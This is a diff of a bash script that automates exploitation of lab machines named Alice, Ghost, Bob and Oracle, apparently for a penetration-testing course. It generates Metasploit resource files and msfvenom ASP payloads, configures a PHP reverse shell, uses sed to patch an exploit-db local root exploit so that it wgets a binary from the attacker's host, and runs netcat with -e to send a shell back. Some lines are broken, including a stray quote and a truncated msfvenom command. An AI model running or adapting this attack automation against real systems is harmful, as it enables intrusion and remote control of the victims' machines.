+# echo -e "\n\n[*] Do you wish to kill the spawned terminals for this hack on "$uip
+# read death
+# if [ $rev == "Y" && $rev == "y" ];then
+#  ps -A xf | grep bobmh.rc | grep "ruby" | cut -d " " -f1 | xargs kill -9
+# else
+#  echo -e "\n\n[*] Leaving spawned terminals open for "$uip 
+# fi
+#fi
+
+#if [ `echo $uip | cut -d"." -f4` == "204" ]; then
+# echo -e "\n\n[*] Do you wish to kill the spawned terminals for this hack on "$uip
+# read death
+# if [ $rev == "Y" ];then
+#  ps -A xf | grep bobmh2.rc | grep "ruby" | cut -d " " -f1 | xargs kill -9
+# else
+#  echo -e "\n\n[*] Leaving spawned terminals open for "$uip 
+# fi
+#fi
+#
+################################################################################
+#~~~~~~~~~~~~~~~~~~~~~> REV-A-BOX & EXPLOITATION SECTION <~~~~~~~~~~~~~~~~~~~~~#
+################################################################################
+#
+# start REV-A-BOX
+doarevwget() {
+  if [ $toctet == "11" ];
+    then
+      vmlocation="vm10";
+      revip="10.10.10.7"
+    elif [ $toctet == "13" ];
+      then
+        vmlocation="vm12";
+        revip="10.10.11.7"
+    elif [ $toctet == "15" ];
+      then
+        vmlocation="vm21";
+        revip="10.10.14.7"
+  fi;
+  wg="wget ";
+  nocheck="--no-check-certificate ";
+  post="--post-data=\"";
+  action="awlAction=login&";
+  username="awlUserName=OSIDNUM&";
+  passwd="awlPasswd=PASSWORD&";
+  ipaddr="ip=$revuip&";
+  type="type=servers&";
+  ipaddr="ip=$revuip&";
+  strike="strike=0&";
+  location="location=$vmlocation\" ";
+  serverurl="https://$revip/functions/revert_machine_admin.php";
+  revcmd="$wg$nocheck$post$action$username$passwd$ipaddr$type$ipaddr$strike$location$serverurl"
+  cleanup() {
+    rm ./revert_machine_admin.php* 2>/dev/null;
+  }
+  (`$revcmd`);
+  (cleanup);
+}
+# reverting panel
+REVABOC() {
+  takerevin() {
+    if [ $select == "revert" ];
+      then
+        #echo -e "\n\n[*] Do you wish to revert the machine "$uip
+        #echo -e "\n\t\t[*] Please enter (Y) for Yes or (ANYTHING) else for No\n"
+        checkthebrakesTop;
+        echo -e "\n\n[*] Please enter an IP address of the machine you wish to revert\n\t"
+        checkthebrakesBot;
+        read revuip
+    fi;
+  }
+  takerevin;
+  doublecheckrev() {
+    checkthebrakesTop'
+    echo -e "\n\n\t[*] Do you wish to revert the machine "$uip
+    echo -e "\n\t\t[*] Please enter (Y) for Yes or (ANYTHING) else for No\n"
+    read doublerev
+    checkthebrakesBot;
+  }
+  doublecheckrev;
+    if [ $doublerev == "Y" ];
+      then
+        doarevwget;
+      else
+        takerevin;
+    fi;
+  }
+  doublecheckrev()
+  # end revert
+}
 checkVPNaccess() {
   # check for vpn connectivity
   if [ "`ifconfig | grep "$1.255" | tr -s " " | cut -d":" -f2 | cut -d " " -f1`" != "" ];
     then
-      checkthebrakesTop
-      echo -e "\t[*] Labs $1 are active and connected with the IP of $lh1";
-      checkthebrakesBot
+      echoStatement "Labs $1 are active and connected with the IP of $lh1";
     else
-     checkthebrakesTop
-     echo -e "\t[*] Starting Labs $1 vpn connection";
-     checkthebrakesBot
-     makeXtermLog OpenVPN_Connection_$toctet OpenVPN-Connection-$toctet OpenVPN-Connection-$toctet 'openvpn $labs$1; sleep 5'
+     echoStatement "Starting Labs $1 vpn connection";
+     (makeXtermLog "OpenVPN_Connection_$toctet" "openvpn $labs$1; sleep 5" &) >/dev/null
      recheckVPN() {
        if [ "`ip -4 -o addr | grep "$1.255" | tr -s " " | cut -d " " -f6`" == "" ];
          then
-           checkthebrakesTop;
-           echo -e "\t[*] Labs $1 have failed to connect, exiting ...";
-           checkthebrakesBot
-           exit 1;
+           echoStatement "Labs $1 have failed to connect, exiting ...";
          else 
-           checkthebrakesTop
-           echo -e "\t[*] Labs $1 are active and connected with the IP of $lh1";
-           checkthebrakesBot
+           echoStatement "Labs $1 are active and connected with the IP of $lh1";
        fi;
      }
      recheckVPN $1;
   fi;
 }
-(checkVPNaccess 11);
-(checkVPNaccess 13);
-(checkVPNaccess 15);
+#checkVPNaccess 11
+#checkVPNaccess 13
+#checkVPNaccess 15
 #
 # Get inet4 address from interface
 #
@@ -363,7 +799,7 @@ getIPaddresses() {
     done
   done
 }
-(getIPaddresses);
+#(getIPaddresses);
 ################################################################################
 #~~~~~~~~~~~~~~~~~~~~~~~~~~> MAIN APPLICATION LOGIC <~~~~~~~~~~~~~~~~~~~~~~~~~~#
 ################################################################################
@@ -374,32 +810,26 @@ getIPaddresses() {
 AliceInWonderland() {
   makeAliceRC() {
     # Alice RC file generation
-    if [ ! -f $msfs/alice$toctet.rc ];
+    if [ ! -f $msfs/alice$toctet$loctet.rc ];
       then
-        checkthebrakesTop;
-        echo -e "\t[*] Producing file: $msfs/alice$toctet.rc" ;
-        checkthebrakesBot;
-        echo "use $aliceExploit" > $msfs/alice$toctet.rc
-        echo "set rhost $uip" >> $msfs/alice$toctet.rc
-        echo "set lhost $AttackIP" >> $msfs/alice$toctet.rc
-        echo "set lport $lp" >> $msfs/alice$toctet.rc
-        echo "set payload $pay" >> $msfs/alice$toctet.rc
-        echo "set $DPH" >> $msfs/alice$toctet.rc
-        echo "exploit" >> $msfs/alice$toctet.rc
-        echo "sleep 5" >> $msfs/alice$toctet.rc
-        echo "exit" >> $msfs/alice$toctet.rc
+        echoStatement "Producing file: $msfs/alice$toctet$loctet.rc" ;
+        echo "use $aliceExploit" > $msfs/alice$toctet$loctet.rc
+        echo "set rhost $uip" >> $msfs/alice$toctet$loctet.rc
+        echo "set lhost $AttackerIP" >> $msfs/alice$toctet$loctet.rc
+        echo "set lport $lp" >> $msfs/alice$toctet$loctet.rc
+        echo "set payload $winmetrev" >> $msfs/alice$toctet$loctet.rc
+        echo "set $DPH" >> $msfs/alice$toctet$loctet.rc
+        echo "exploit" >> $msfs/alice$toctet$loctet.rc
+        echo "sleep 5" >> $msfs/alice$toctet$loctet.rc
+        echo "exit" >> $msfs/alice$toctet$loctet.rc
     fi;
   }
   makeAliceRC;
   #
   # Alice Exploitation 
-  checkthebrakesTop;
-  echo -e "\t[*] Starting Alice Exploitation" ;
-  checkthebrakesBot;
-  (makeXtermLog "Alice-$toctet-Exploitation" "$msfc -r $msfs/alice$toctet.rc && sleep 5" &) > /dev/null
-  checkthebrakesTop;
-  echo -e "\t[*] Finished Alice Exploitation" ;
-  checkthebrakesBot;
+  echoStatement "Starting Alice Exploitation" ;
+  (makeXtermLog "Alice-$toctet-Exploitation" "$msfc -r $msfs/alice$toctet$loctet.rc && sleep 5" &) > /dev/null
+  echoStatement "Finished Alice Exploitation" ;
 }
 ################################################################################
 #~~~~~~~~~~~~~~~> GHOST CONFIGURATION AND EXPLOITATION SECTION <~~~~~~~~~~~~~~~#
@@ -409,59 +839,43 @@ GhostAttack() {
   # make Ghost dir in webserver
   if [ ! -d $webdir/ghost ]; 
     then
-      checkthebrakesTop;
-      echo -e "\t[*] Producing Dir: $webdir/ghost" ;
-      checkthebrakesBot;
+      echoStatement "Producing Dir: $webdir/ghost" ;
       mkdir $webdir/ghost
   fi;
   if [ ! -d $msfs/ghost ]; 
     then
-      checkthebrakesTop;
-      echo -e "\t[*] Producing Dir: $msfs/ghost" ;
-      checkthebrakesBot;
+      echoStatement "Producing Dir: $msfs/ghost" ;
       mkdir $msfs/ghost
   fi
-  checkmonkey;
-  # starts the process to exploit ghost on subnet 11
-  checkthebrakesTop;
-  echo -e "\t[*] Revert Ghost to ensure a clean environment before attacking" ;
-  checkthebrakesBot;
+  (checkmonkey);
+  echoStatement "Revert Ghost to ensure a clean environment before attacking" ;
   # might think about reverting Ghost before attacking
   # start apache remove PHP5 for Ghost exploit to serve properly  
   if [ "$apache2" != "apache2" ];
     then
-      checkthebrakesTop;
-      echo -e "\t[*] Disable PHP 7.0, Start Apache" ;
-      checkthebrakesBot;
-      a2dismod php7.0 >/dev/null;
-      systemctl start apache2 >/dev/null;
+      echoStatement "Disable PHP 7.0, Start Apache" ;
+      (disablephprestart)
     else
-      checkthebrakesTop;
-      echo -e "\t[*] Stop Apache, Disable PHP 7.0, Re-Start Apache" ;
-      checkthebrakesBot;
-      systemctl stop apache2 >/dev/null;
-      a2dismod php7.0 >/dev/null;
-      systemctl start apache2 >/dev/null;
+      echoStatement "Stop Apache, Disable PHP 7.0, Re-Start Apache" ;
+      (stopdisablephprestart)
   fi;
   # checks for reverse shell for ghost.php - simple redundency! in case something changes
   makeGhostPHP() {
-    if [ ! -f $msfs/ghost/ghost$toctet.php ]; 
+    if [ ! -f $msfs/ghost/ghost$toctet$loctet.php ]; 
       then
-        checkthebrakesTop;
-        echo -e "\t[*] Producing file: $msfs/ghost/ghost$toctet.php" ;
-        checkthebrakesBot;
+        echoStatement "Producing file: $msfs/ghost/ghost$toctet$loctet.php" ;
         cat $msfs/php-reverse-shell-1.0/php-reverse-shell.php |\
-          sed -r "s/(ip = )(.*)/\1'`echo $AttackerIP`';/g" |\
-          sed -r "s/(port = )(.*)/\1 8080;/g" |\
+          sed -r "s/(ip = )(.*)/\1'$AttackerIP';/g" |\
+          sed -r "s/(port = )(.*)/\1 6341;/g" |\
           sed -r "s/\/\/(.*)//" |\
           grep -Ev "^$" |\
-          sed '/^\s*$/d' > $msfs/ghost/ghost$toctet.php 
-        if [ ! -f $webdir/ghost/header.inc.php ]; 
+          sed '/^\s*$/d' |\
+          sed -r "s/<\?php/<\?php\n\/\/ Description: `echo $newdes`/g" |\
+          sed -r "s/(shell = ')(.*)/\1echo `echo $newdes` > `echo $newdes` 2>\/dev\/null\; \2/g"> $msfs/ghost/ghost$toctet$loctet.php
+        if [ ! -f $webdir/ghost/header$toctet$loctet.inc.php ]; 
           then
-            checkthebrakesTop;
-            echo -e "\t[*] Moving PHP-REV-SHELL to: $webdir/ghost/header.inc.php " ;
-            checkthebrakesBot;
-            cp $msfs/ghost/php-reverse-shell-1.0/ghost$toctet.php $webdir/ghost/header.inc.php
+            echoStatement "Copy PHP-REV-SHELL to: $webdir/ghost/header$toctet$loctet.inc.php " ;
+            cp $msfs/ghost/ghost$toctet$loctet.php $webdir/ghost/header$toctet$loctet.inc.php
         fi;    
     fi;
   }
@@ -470,49 +884,46 @@ GhostAttack() {
   makeGhostCasper() {
     if  [ ! -f $webdir/ghost/casper.c ]; 
       then
-        checkthebrakesTop;
-        echo -e "\t[*] Producing file: $webdir/ghost/casper.c " ;
-        checkthebrakesBot;
+        echoStatement "Producing file: $webdir/ghost/casper.c " ;
         cat /usr/share/exploitdb/platforms/linux/local/12130.py |\
           grep "SHELL =" |\
           cut -d" " -f3- |\
-          cut -d"'" -f2 > $webdir/ghost/casper.c
+          cut -d"'" -f2 |\
+          sed -r "s/(.*)/\1\n\/* `echo $newdes` *\//g"> $webdir/ghost/casper.c
     fi;
     if  [ ! -f $webdir/ghost/casper ]; 
       then
-        checkthebrakesTop;
-        echo -e "\t[*] Compiling: $webdir/ghost/casper.c, output: $webdir/ghost/casper " ;
-        checkthebrakesBot;
-        gcc -w $webdir/ghost/casper.c -o $webdir/ghost/casper
+        echoStatement "Compiling: $webdir/ghost/casper.c, output: $webdir/ghost/casper " ;
+        gcc -w $webdir/ghost/casper.c -o $webdir/ghost/casper 2>/dev/null
     fi
   }
   makeGhostCasper;
   # SED commands to produce a modified PoC to use on ghost machine subnet
   makeGhostPOC() {
     if [ ! -f $webdir/ghost/casper.py ]; then 
-      checkthebrakesTop;
-      echo -e "\t[*] Producing file: $webdir/ghost/casper.py " ;
-      checkthebrakesBot;
+      echoStatement "Producing file: $webdir/ghost/casper.py " ;
       cat /usr/share/exploitdb/platforms/linux/local/12130.py |\
-      sed -r "s/SHELL =(.*)//g" |\
-      sed -r "s/if not os.path.exists\('\/.reiserfs_priv\/xattrs'\):/if not os.path.exists('\/apachelogs\/.reiserfs_priv\/xattrs'\):/g" |\
-      sed -r "s/msg\('preparing shell in \/tmp'\)//g" |\
-      sed -r "s/err\('error setting xattr, you need setfattr'\)//g" |\
-      sed -r "s/f = open\('\/tmp\/team-edward.c', 'w'\)//g" |\
-      sed -r "s/f.write\(SHELL\)//g" |\
-      sed -r "s/f.close\(\)//g" |\
-      sed -r "s/pre = set\(os.listdir\('\/.reiserfs_priv\/xattrs'\)\)/pre = set\(os.listdir\('\/apachelogs\/.reiserfs_priv\/xattrs'\)\)/g" |\
-      sed -r "s/msg\('compiling shell in \/tmp'\)/print '[\*] no1special HaxOred Me'/g" |\
-      sed -r "s/ret = os.system\('gcc -w \/tmp\/team-edward.c -o \/tmp\/team-edward'\)/ret = os.system\('wget --quiet http:\/\/$AttackerIP\/ghost\/casper'\)/g" |\
-      sed -r "s/if ret \!= 0://g" |\
-      sed -r "s/err\('error compiling shell\, you need gcc'\)/\n    os.system\('chmod 755 \/apachelogs\/data\/casper'\)/g" |\
-      sed -r "s|(os\.system\('setfattr -n \"user.hax\" -v \"hax\" )(.*)|\1\/apachelogs\/data\/casper\'\)|g" |\
-      sed -r "s/(post = set\(os.listdir\(')(.*)/\1\/apachelogs\/.reiserfs_priv\/xattrs'\)\)/g" |\
-      sed -r "s/(f = open\('\/).reiserfs_priv\/(.*)/\1apachelogs\/.reiserfs_priv\/xattrs\/\%s\/security\.capability' \% obj\, \'w\')/g"  |\
-      sed -r "s/os.system\('\/tmp\/team-edward'\)/os.system\('\/apachelogs\/data\/casper'\)/g" |\
-      sed -r "s/if __name__ == '__main__':/    os.system\('id'\)/g"  |\
-      sed -r "s/main\(\)//g" |\
-      sed -r "s/def :/def main\(\):/g" > $webdir/ghost/caspertmp.py
+        sed -r "s/SHELL =(.*)//g" |\
+        sed -r "s/if not os.path.exists\('\/.reiserfs_priv\/xattrs'\):/if not os.path.exists('\/apachelogs\/.reiserfs_priv\/xattrs'\):/g" |\
+        sed -r "s/msg\('preparing shell in \/tmp'\)//g" |\
+        sed -r "s/err\('error setting xattr, you need setfattr'\)//g" |\
+        sed -r "s/f = open\('\/tmp\/team-edward.c', 'w'\)//g" |\
+        sed -r "s/f.write\(SHELL\)//g" |\
+        sed -r "s/f.close\(\)//g" |\
+        sed -r "s/pre = set\(os.listdir\('\/.reiserfs_priv\/xattrs'\)\)/pre = set\(os.listdir\('\/apachelogs\/.reiserfs_priv\/xattrs'\)\)/g" |\
+        sed -r "s/msg\('compiling shell in \/tmp'\)/print '[\*] no1special HaxOred Me'/g" |\
+        sed -r "s/ret = os.system\('gcc -w \/tmp\/team-edward.c -o \/tmp\/team-edward'\)/ret = os.system\('wget --quiet http:\/\/$AttackerIP\/ghost\/casper'\)/g" |\
+        sed -r "s/if ret \!= 0://g" |\
+        sed -r "s/err\('error compiling shell\, you need gcc'\)/\n    os.system\('chmod 755 \/apachelogs\/data\/casper'\)/g" |\
+        sed -r "s|(os\.system\('setfattr -n \"user.hax\" -v \"hax\" )(.*)|\1\/apachelogs\/data\/casper\'\)|g" |\
+        sed -r "s/(post = set\(os.listdir\(')(.*)/\1\/apachelogs\/.reiserfs_priv\/xattrs'\)\)/g" |\
+        sed -r "s/(f = open\('\/).reiserfs_priv\/(.*)/\1apachelogs\/.reiserfs_priv\/xattrs\/\%s\/security\.capability' \% obj\, \'w\')/g"  |\
+        sed -r "s/os.system\('\/tmp\/team-edward'\)/os.system\('\/apachelogs\/data\/casper'\)/g" |\
+        sed -r "s/if __name__ == '__main__':/    os.system\('id'\)/g"  |\
+        sed -r "s/main\(\)//g" |\
+        sed -r "s/def :/def main\(\):/g" |\
+        sed -r "s/\#\!\/usr\/bin\/env python/\#\!\/usr\/bin\/env python\n\# Description: `echo $newdes`\nprint \"$newdes\"/g" |\
+        sed "/^\s*$/d" > $webdir/ghost/caspertmp.py
       echo "if __name__ == '__main__':" >> $webdir/ghost/caspertmp.py
       echo "    main()" >> $webdir/ghost/caspertmp.py
       cat $webdir/ghost/caspertmp.py | sed '/^\s*$/d' > $webdir/ghost/casper.py
@@ -522,9 +933,7 @@ GhostAttack() {
   }
   makeGhostPOC;
   GhostExploitPOC() {
-    checkthebrakesTop;
-    echo -e "\t[*] Prepairing to Exploit Ghost " ;
-    checkthebrakesBot;
+    echoStatement "Prepairing to Exploit Ghost " ;
     # Giving up the Ghost - DJ Shadow 
     GhostGodModeStep1(){
       GodMode1="echo 'mount /apachelogs && \
@@ -533,34 +942,27 @@ GhostAttack() {
           python ./casper.py && \
           /bin/netcat $AttackerIP 8081 -e /apachelogs/data/casper' |\
           nc -l -v -p 8080"
-      checkthebrakesTop;
-      echo -e "\t[*] Ghost Exploitation Stage 1 (Echo through NetCat)" ;
-      checkthebrakesBot;
+      echoStatement "Ghost Exploitation Stage 1 (Echo through NetCat)" ;
       (makeXtermLog "Ghost-Exploit-Stage1" "$GodMode1; sleep 5" &) >/dev/null
     }
     (GhostGodModeStep1);
     sleep 5;
     GhostGodModeStep2() {
       GodMode2="nc -l -v -p 8081"
-      checkthebrakesTop;
-      echo -e "\t[*] Ghost Exploitation Stage 2 (NetCat Listener)" ;
-      checkthebrakesBot;
+      echoStatement "Ghost Exploitation Stage 2 (NetCat Listener)" ;
       (makeXtermLog "Ghost-Exploit-Stage2" "$GodMode2; sleep 5" &) > /dev/null
     }
     (GhostGodModeStep2);
     sleep 5;
     GhostGodModeStep3() {
-      GodMode3="wget http://$uip/1/slogin_lib.inc.php?slogin_path=http://$AttackerIP/ghost$toctet/header.inc.php? &&\
+      GodMode3="wget -t 1 -T 5 \
+          http://$uip/1/slogin_lib.inc.php?slogin_path=http://$AttackerIP/ghost$toctet/header.inc.php? &&\
           rm -rf \"slogin_lib.inc.php?slogin_path=http:%2F%2F$AttackerIP%2Fghost$toctet%2Fheader.inc.php\""
-      checkthebrakesTop;
-      echo -e "\t[*] Ghost Exploitation Stage 3 (Exploit Trigger wget)" ;
-      checkthebrakesBot;
+      echoStatement "Ghost Exploitation Stage 3 (Exploit Trigger wget)" ;
       (makeXtermLog "Ghost-Exploit-Stage3" "$GodMode3; sleep 5" &) > /dev/null
     }
     (GhostGodModeStep3);
-    checkthebrakesTop;
-    echo -e "\t[*] Ghost Exploitation Stage Complete, Waiting 90 Seconds for shell " ;
-    checkthebrakesBot;
+    echoStatement "Ghost Exploitation Stage Complete, Waiting 90 Seconds for shell " ;
     sleep 90; # must wait 1m30s for local exploitation to take place;
   }
   (GhostExploitPOC);
@@ -573,9 +975,7 @@ GhostAttack() {
       xargs kill -9;
   }
   (FootTrap);
-  checkthebrakesTop;
-  echo -e "\t[*] Ghost Exploitation has commenced " ;
-  checkthebrakesBot;
+  echoStatement "Ghost Exploitation has commenced " ;
 }
 ################################################################################
 #~~~~~~~~~~~~~~~~> BOB CONFIGURATION AND EXPLOITATION SECTION <~~~~~~~~~~~~~~~~#
@@ -584,45 +984,33 @@ killBoB() {
   prepSysforBoB() {
     if [ ! -d $msfs/bob ];
       then
-        checkthebrakesTop;
-        echo -e "\t[*] Making Dir: $msfs/bob"
-        checkthebrakesBot;
+        echoStatement "Making Dir: $msfs/bob"
         mkdir $msfs/bob
     fi;
     subnet=`echo $uip | sed -r "s/(.*)\.(.*)/\1\.0/g"`
     if [ $toctet == "11" ];
       then
-        checkthebrakesTop;
-        echo -e "\t[*] Setting Attacker IP to: $lh1"
-        checkthebrakesBot;
+        echoStatement "Setting Attacker IP to: $lh1"
         AttackerIP=$lh1
       elif [ $toctet == "13" ];
         then
-        checkthebrakesTop;
-        echo -e "\t[*] Setting Attacker IP to: $lh3"
-        checkthebrakesBot;
+        echoStatement "Setting Attacker IP to: $lh3"
           AttackerIP=$lh2
       elif [ $toctet == "15" ];
         then
-        checkthebrakesTop;
-        echo -e "\t[*] Setting Attacker IP to: $lh3"
-        checkthebrakesBot;
+        echoStatement "Setting Attacker IP to: $lh3"
           AttackerIP=$lh3
     fi;
     # kill apache is running 
     if [ "`netstat -antelop | tr -s " " | grep -i "apache" | cut -d" " -f6 | sort -u`" == "LISTEN" ]; 
       then
-        checkthebrakesTop;
-        echo -e "\t[*] Stopping Apache2 as needed for Exploitation of Bob"
-        checkthebrakesBot;
+        echoStatement "Stopping Apache2 as needed for Exploitation of Bob"
         systemctl stop apache2; 
     fi;
     # kill sshd just to refresh it!
     if [ "`netstat -antelop | tr -s " " | grep -i "sshd" | cut -d" " -f6 | sort -u`" == "LISTEN" ]; 
       then
-        checkthebrakesTop;
-        echo -e "\t[*] Stopping SSHD as needed for Exploitation of Bob"
-        checkthebrakesBot;
+        echoStatement "Stopping SSHD as needed for Exploitation of Bob"
         systemctl stop ssh
     fi;
   }
@@ -631,14 +1019,12 @@ killBoB() {
   bobPlinkRC() {
     if [ ! -f $msfs/bob/bobPlink$toctet.rc ]; 
       then
-        checkthebrakesTop;
-        echo -e "\t[*] Producing Bob Plink RC file:\n\t\t$msfs/bob/bobPlink$toctet.rc"
-        checkthebrakesBot;
+        echoStatement "Producing Bob Plink RC file:\n\t\t$msfs/bob/bobPlink$toctet.rc"
         echo -e "use $bobExploit" > $msfs/bob/bobPlink$toctet.rc
         echo -e "set rhost 127.0.0.1" >> $msfs/bob/bobPlink$toctet.rc
         echo -e "set $DPH" >> $msfs/bob/bobPlink$toctet.rc
         echo -e "set lport $lp" >> $msfs/bob/bobPlink$toctet.rc
-        echo -e "set payload $pay" >> $msfs/bob/bobPlink$toctet.rc
+        echo -e "set payload $winmetrev" >> $msfs/bob/bobPlink$toctet.rc
         echo -e "set lhost $AttackerIP" >> $msfs/bob/bobPlink$toctet.rc
         echo -e "exploit" >> $msfs/bob/bobPlink$toctet.rc
     fi;
@@ -648,11 +1034,9 @@ killBoB() {
   bobAutorouteRC() {
     if [ ! -f $msfs/bob/bobAutoroute$toctet.rc ]; 
       then
-        checkthebrakesTop;
-        echo -e "\t[*] Producing Bob AutoRoute RC file:\n\t\t$msfs/bob/bobAutoroute$toctet.rc"
-        checkthebrakesBot;
+        echoStatement "Producing Bob AutoRoute RC file:\n\t\t$msfs/bob/bobAutoroute$toctet.rc"
         echo "use $handler" > $msfs/bob/bobAutoroute$toctet.rc
-        echo "set PAYLOAD $pay" >> $msfs/bob/bobAutoroute$toctet.rc
+        echo "set PAYLOAD $winmetrev" >> $msfs/bob/bobAutoroute$toctet.rc
         echo "set LPORT 80" >> $msfs/bob/bobAutoroute$toctet.rc
         echo "set LHOST 0.0.0.0" >> $msfs/bob/bobAutoroute$toctet.rc
         echo "set ExitOnSession false" >> $msfs/bob/bobAutoroute$toctet.rc
@@ -669,7 +1053,7 @@ killBoB() {
         echo "set lhost $AttackerIP" >> $msfs/bob/bobAutoroute$toctet.rc
         echo "set $DPH" >> $msfs/bob/bobAutoroute$toctet.rc
         echo "set lport $lp" >> $msfs/bob/bobAutoroute$toctet.rc
-        echo "set payload $pay" >> $msfs/bob/bobAutoroute$toctet.rc
+        echo "set payload $winmetrev" >> $msfs/bob/bobAutoroute$toctet.rc
         echo "exploit" >> $msfs/bob/bobAutoroute$toctet.rc
     fi;
   }
@@ -677,10 +1061,9 @@ killBoB() {
   evilBobASP() {
     if [ ! -f $msfs/bob/evil$toctet.asp ]; 
       then
-        checkthebrakesTop;
-        echo -e "\t[*] Producing Bob EvilASP file:\n\t\t$msfs/bob/evil$toctet.asp"
-        checkthebrakesBot
-        msfvenom -p $pay \
+        echoStatement "Producing Bob EvilASP file:\n\t\t$msfs/bob/evil$toctet.asp"
+        msfvenom -p $
+        \
           LHOST=$AttackerIP \
           LPORT=$lp \
           RHOST=$uip \
@@ -693,9 +1076,7 @@ killBoB() {
   evilBobEXEC() {
     if [ ! -f $msfs/bob/bobExec$toctet.asp ];
       then
-        checkthebrakesTop;
-        echo -e "\t[*] Producing Bob EvilExecASP file:\n\t\t$msfs/bob/bobExec$toctet.asp"
-        checkthebrakesBot;
+        echoStatement "Producing Bob EvilExecASP file:\n\t\t$msfs/bob/bobExec$toctet.asp"
         $msfv -p windows/exec \
           CMD='cmd.exe /c "c:\inetpub\wwwroot\plink.exe \
               -auto_store_key_in_cache -C -P 22 \
@@ -713,9 +1094,7 @@ killBoB() {
    evilBobFTP() {
      if [ ! -f $msfs/bob/bobftp$toctet.txt ]; 
        then
-         checkthebrakesTop;
-         echo -e "\t[*] Producing Bob EvilFTP file:\n\t\t$msfs/bob/bobftp$toctet.txt"
-         checkthebrakesBot;
+         echoStatement "Producing Bob EvilFTP file:\n\t\t$msfs/bob/bobftp$toctet.txt"
          echo "!#/usr/local/bin/kermit +" > $msfs/bob/bobftp$toctet.txt
          echo "ftp open $uip /anonymous" >> $msfs/bob/bobftp$toctet.txt
          echo "ftp cd wwwroot" >> $msfs/bob/bobftp$toctet.txt
@@ -730,50 +1109,37 @@ killBoB() {
   }
   evilBobFTP;
   howtoRoute() {
-    checthebrakesTop;
-    echo -e "\t[*] Do you wish to use plink or autoroute?\n\t\t[*] Please type [plink] or [auto]"
-    checthebrakesBot
+    echoStatement "Do you wish to use plink or autoroute?\n\t\t[*] Please type [plink] or [auto]"
     read autop
     if [ $autop == "plink" ]; 
       then
         if [ "`netstat -antelop | grep -E "sshd" | tr -s " " | cut -d " " -f6 | sort -u`" != "LISTEN" ]; 
           then
-            checkthebrakesTop;
-            echo -e "\t[*] Stopping SSHD as needed for Exploitation of Bob"
-            checkthebrakesBot;
+            echoStatement "Stopping SSHD as needed for Exploitation of Bob"
             # must have sshd service enabled for Plink to connect via SSH
             systemctl start ssh;
         fi;
         sleep 5;
-        checkthebrakesTop;
-        echo -e "\t[*] Starting Automated FTP Uploader, Ckermit"
-        checkthebrakesBot;
+        echoStatement "Starting Automated FTP Uploader, Ckermit"
         (makeXtermLog "Bobs$toctet_Automated_FTP_uploader" "kermit $msfs/bob/bobftp$toctet.txt" &) >/dev/null;
         sleep 60;
-        checkthebrakesTop;
-        echo -e "\t[*] Starting Evil ASP EXEC Wget Spider"
-        checkthebrakesBot;
+        echoStatement "Starting Evil ASP EXEC Wget Spider"
         (makeXtermLog "Bobs$toctet_Evil_EXEC_ASP_Page" "wget --spider http://$uip/bobExec$toctet.asp" &) >/dev/null
         sleep 60;
+        echoStatement "Starting Plink from Bob to `hostname`"
         (makeXtermLog "NetAPI_Plink_Bob_localhost" "$msfc -r $msfs/bob/bobPlink$toctet.rc" &) >/dev/null
         sleep 60;
     fi;
     if [ $autop == "auto" ];
       then
         sleep 10  
-        checkthebrakesTop;
-        echo -e "\t[*] Starting AutoRoute RC Handler"
-        checkthebrakesBot;
+        echoStatement "Starting AutoRoute RC Handler"
         (makeXtermLog "Bobs_Autoroute_RC_Handle" "$msfc -r $msfs/bob/bobAutoroute$toctet.rc" &) >/dev/null
         sleep 5;
-        checkthebrakesTop;
-        echo -e "\t[*] Starting Automated FTP Uploader, Ckermit"
-        checkthebrakesBot;
+        echoStatement "Starting Automated FTP Uploader, Ckermit"
         (makeXtermLog "Bobs FTP Ckermit uploader" "kermit $msfs/bob/bobftp$toctet.txt" &) > /dev/null
         sleep 20;
-        checkthebrakesTop;
-        echo -e "\t[*] Starting Evil ASP EXEC Wget Spider"
-        checkthebrakesBot;
+        echoStatement "Starting Evil ASP EXEC Wget Spider"
         (makeXtermLog "Bobs$toctet_Evil_EXEC_ASP_Page" "wget --spider http://$uip/bobExec$toctet.asp" &) >/dev/null
     fi;
     if [ $autop == "" ]; 
@@ -783,54 +1149,35 @@ killBoB() {
   fi;
   }
   howtoRoute;
-  checkthebrakesTop;
-  echo -e "\t[*] Finished Bob Exploitation"
-  checkthebrakesBot;
+  echoStatement "Finished Bob Exploitation"
 }
 ################################################################################
 #~~~~~~~~~~~~~~~~> ORACLE CONFIGURATION AND EXPLOITATION SECTION <~~~~~~~~~~~~~~~~#
 ################################################################################
 talkTotheOracle() {
-  if [ $toctet == "11" ];
-    then
-      AttackerIP=$lh1
-    elif [ $toctet == "13" ];
+  oracleRC() { `# start oracle resource files`
+    if [ ! -f $msfs/oracle$toctet$loctet.rc ];
       then
-        AttackerIP=$lh2
-    elif [ $toctet == "15" ];
-      then
-        AttackerIP=$lh3
-  fi;
-  # start oracle resource files
-  oracleRC() {
-    if [ ! -f $msfs/oracle$toctet.rc" ];
-      then
-        checkthebrakesTop;
-        echo -e "\t[*] Producing file: $msfs/oracle$toctet.rc"
-        checkthebrakesBot;
-        echo "use $oracleExploit" > $msfs/oracle$toctet.rc
-        echo "set rhost $uip" >> $msfs/oracle$toctet.rc
-        echo "set lhost $AttackerIP" >> $msfs/oracle$toctet.rc
-        echo "set lport $lp" >> $msfs/oracle$toctet.rc
-        echo "set payload $pay" >> $msfs/oracle$toctet.rc
-        echo "set $DPH" >> $msfs/oracle$toctet.rc
-        echo "exploit" >> $msfs/oracle$toctet.rc
-        echo "sleep 5" >> $msfs/oracle$toctet.rc
-        echo "exit" >> $msfs/oracle$toctet.rc
+        echoStatement "Producing file: $msfs/oracle$toctet$loctet.rc"
+        echo "use $oracleExploit" > $msfs/oracle$toctet$loctet.rc
+        echo "set rhost $uip" >> $msfs/oracle$toctet$loctet.rc
+        echo "set lhost $AttackerIP" >> $msfs/oracle$toctet$loctet.rc
+        echo "set lport $lp" >> $msfs/oracle$toctet$loctet.rc
+        echo "set payload $winmetrev" >> $msfs/oracle$toctet$loctet.rc
+        echo "set $DPH" >> $msfs/oracle$toctet$loctet.rc
+        echo "exploit" >> $msfs/oracle$toctet$loctet.rc
+        echo "sleep 5" >> $msfs/oracle$toctet$loctet.rc
+        echo "exit" >> $msfs/oracle$toctet$loctet.rc
     fi;
   }
   oracleRC;
   oracleExploit() {
     # start oracle exploitation
-    checkthebrakesTop;
-    echo -e "\t[*] Producing file: $msfs/oracle$toctet.rc"
-    checkthebrakesBot;
-    (makeXtermLog "Oracle-Exploitation" "$msfc -r $msfs/oracle$toctet.rc" &) >/dev/null
+    echoStatement "Starting Exploitation of Oracle"
